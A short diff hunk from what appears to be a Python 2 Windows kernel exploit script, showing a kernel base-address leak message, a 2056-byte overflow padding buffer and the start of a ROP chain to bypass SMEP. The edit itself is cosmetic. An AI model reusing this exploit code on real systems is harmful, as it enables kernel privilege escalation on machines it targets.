@@ -377,7 +377,7 @@ print "[+] Found kernel leak!"
 print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))
 
 # Offset to ret overwrite
-input_buffer = ("\x41" * 2056)
+input_buffer = "\x41" * 2056
 
 # SMEP says goodbye
 print "[+] Starting ROP chain. Goodbye SMEP..."
